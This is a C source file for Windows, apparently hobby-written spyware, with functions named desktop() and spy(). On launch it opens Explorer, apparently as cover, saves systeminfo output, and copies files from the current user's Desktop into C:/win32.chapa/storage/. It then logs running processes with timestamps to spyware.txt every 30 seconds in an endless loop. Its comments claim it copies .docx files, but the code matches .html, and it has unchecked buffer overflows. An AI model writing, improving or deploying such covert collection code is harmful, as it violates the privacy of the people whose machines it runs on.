#include <stdio.h>
#include <sys/types.h>
#include <dirent.h>
#include<stdlib.h>
#include<string.h>
#include<time.h>
#include<windows.h>


/*
*********
the function which has been written below is called in the function desktop() which will come next.
the main task of this frmt(char *p) function is to get a file name and detect if the file is a .docx file and
return 1 if true. else it will return 0....
*/

int frmt(char *p)
{
    while(*p!='\0') p++;
    while(*p!='.') p--;
    p=p+1;
    char tmp[5];
    char frm[]="html";
    int i=0;
    while(*p)
    {
        tmp[i]=*p;
        p++;
        i++;
    }
    tmp[i]='\0';
    //printf("%s\n",tmp);
    if(strcmp(frm,tmp)==0) return 1;
    return 0;

}

//this copyfile() function is called in the desktop function copies the specified files

void copyfile(char *p)
{
    char temp[100];
    int i=0;
    char path[500];
    while(*p!='\0') {path[i]=*p; i++; p++;}
    path[i]='\0';
    printf("%s\n",path);
    char dest[500]="C:/win32.chapa/storage/";
    char *d;
    d=path;
    i=0;
    while(*d!='\0') d++;
    while(*d!='/') d--;
    d=d+1;
    while(*d!='\0') {temp[i]=*d;i++;d++; }
    temp[i]='\0';
    strcat(dest,temp);
    printf("%s\n",dest);
    FILE *old,*rec;
    old=fopen(path,"rb");
    rec=fopen(dest,"ab");
    char ch;
    while(fread(&ch,sizeof(ch),1,old))
    {
        fwrite(&ch,sizeof(ch),1,rec);
    }
    fclose(old);
    fclose(rec);
}


/*
********
the function desktop() which is written below , it's task is to get all the file name of users desktop folder
and make a copy of all .docx files if there is any....
*/

void desktop()
{
    system("whoami>pcname.txt");
    char name[100],tmp[100],*p;
    char path[200]="C:/users/";
    int c=92;
    FILE *fp;
    fp=fopen("pcname.txt","r");
    fgets(name,100,fp);
    fclose(fp);
    p=name;
    while(*p!=c)    p++;
    p=p+1;
    int i=0;
    while(*p!='\0')
    {
        tmp[i]=*p;
        p++;
        i++;
    }
    tmp[i-1]='\0';
    strcat(path,tmp);
    strcat(path,"/desktop/");
    DIR *dp;
    char *q;
    struct dirent *ep;
    dp=opendir(path);
    char *r;
    char filename[100];
    if(dp!=NULL)
    {
        int i=0;
        while(ep=readdir(dp))
        {
            if(i>=2)
            {
                q=ep->d_name;
                if(frmt(q)) //printf("%s\n",ep->d_name);
                {
                    strcpy(filename,path);
                    strcat(filename,ep->d_name);
                    r=filename;
                    copyfile(r);
                }
            }
            i++;
        }
        (void)closedir(dp);
    }
    else printf("don't exist");
}


/*
********the spy() function records all the running apps and makes a list of them i8n atext file timewise....
*/

void spy()
{
    struct tm *systime;
    time_t t;

    system("tasklist -fo csv>virus.txt");
    char a,b;FILE *spy;
    FILE *real;
    char str[700][50];//eitay rakhbo
    char str2[200][50];
    int i,j,k,m,cnt=0;
    spy=fopen("virus.txt","r");
    char temp[500],*p;//eita k niye kaj
    int flag,tf;
    real=fopen("spyware.txt","a");
    t=time(NULL);
    systime=localtime(&t);
    fprintf(real,"%.2d:%.2d:%.2d\n",systime->tm_hour,systime->tm_min,systime->tm_sec);
    fprintf(real,"%.2d-%.2d-%-2d\n",systime->tm_mday,systime->tm_mon+1,systime->tm_year+1900);fprintf(real,"\n");
    while((fgets(temp,500,spy))!=NULL){

        p=temp;flag=0;
        for(i=0;i<5;){
            j=0;
            cnt++;
            if(cnt%5==0){
                while(*p){
                    str[i][j]=*p;
                    j++;
                    p++;
                }
                str[i][j]='\0';
                if(flag==1){
                    k=strlen(str[i]);
                    for(j=60;j>(k+m);j--)fprintf(real," ");
                    //printf("%s\n",str[i]);
                    fputs(str[i],real);
                }
            }
            else{
                while(*p && *p!=','){
                    str[i][j]=*p;
                    j++;
                    p++;
                }
                str[i][j]='\0';//printf("%s\n",str[i]);
            }
            if(cnt%5==3){
                if(str[i][1]=='C'){
                    flag=1;
                    //printf("%s",str[i-2]);
                    fputs(str[i-2],real);
                    m=strlen(str[i-2]);
                    //fprintf(real,"\t\t\t\t");
                }
            }
            i++;p++;
        }
    }
    fprintf(real,"\n\n\n\n\n\n\n");
    fclose(spy);
    fclose(real);
}



int main()
{
    int i;
    FILE *gp;
    system("explorer.exe");            // this command activates windows explorer
    if(gp=fopen("flag.txt","r"));//printf("Already searched desktop\n");    // it works as a flag which checks if this task has already been done..
    else
    {
        system("systeminfo>flag.txt");    // gets all the info of the pc....
        desktop();
    }



    struct tm *systime;
    time_t t;
    char timec[50];
    int prv,rec,diff;
    FILE *fp;

    if(fp=fopen("time.txt","r"));
    else
    {
        prv=0;
        fp=fopen("time.txt","w");
        fprintf(fp,"%d",prv);
        fclose(fp);
    }

//******** this portion of code is used to maintain exact time interval and also does the main job

    while(1)
    {
        fp=fopen("time.txt","r");
        fgets(timec,50,fp);
        prv=atoi(timec);
        fclose(fp);
        t=time(NULL);
        rec=t;
        diff=rec-prv;

        if(diff<30) Sleep((30-diff)*1000);
        else
        {
            t=time(NULL);
            prv=t;
            fp=fopen("time.txt","w");
            fprintf(fp,"%d",prv);
            fclose(fp);
            //printf("go to hell\n");
            spy();
            Sleep(30000);
        }

    }

    return 0;
}
